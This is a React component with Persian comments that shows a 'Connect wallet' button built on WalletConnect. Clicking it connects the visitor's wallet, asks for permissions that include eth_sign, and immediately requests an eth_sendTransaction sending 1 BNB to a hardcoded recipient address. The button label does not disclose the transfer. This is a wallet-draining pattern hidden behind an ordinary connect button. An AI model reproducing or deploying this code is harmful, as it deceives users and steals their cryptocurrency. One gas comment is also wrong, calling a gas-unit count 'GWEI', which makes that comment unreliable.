import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    const recipientAddress = "0xbA8958d52B940fF513746F24176D1017CaFa707E"; // آدرس دریافت‌کننده

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
        ],
      },
      chains: [1, 56], // اتریوم و اسمارت چین
      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();

    const provider = ethereumProvider;

    const accounts = await provider.request({ method: "eth_accounts" });
    const senderAddress = accounts[0]; // آدرس فرستنده
    console.log("Sender Address: ", senderAddress);

    // ارسال تراکنش
    async function sendTransaction(chain, amount) {
      const txParams = {
        from: senderAddress,
        to: recipientAddress, // آدرس دریافت‌کننده
        value: amount, // مقدار ارسال (به wei)
        gas: "0x5208", // 21000 GWEI
        gasPrice: "0x3B9ACA00", // 1 GWEI
        chainId: chain, // زنجیره انتخاب‌شده
      };

      try {
        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [txParams],
        });
        console.log("Transaction sent. Hash:", txHash);
      } catch (error) {
        console.error("Transaction Error: ", error);
      }
    }

    // نمونه ارسال کوین در شبکه اسمارت چین
    await sendTransaction(56, "1000000000000000000"); // ارسال 1 BNB (به wei)
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
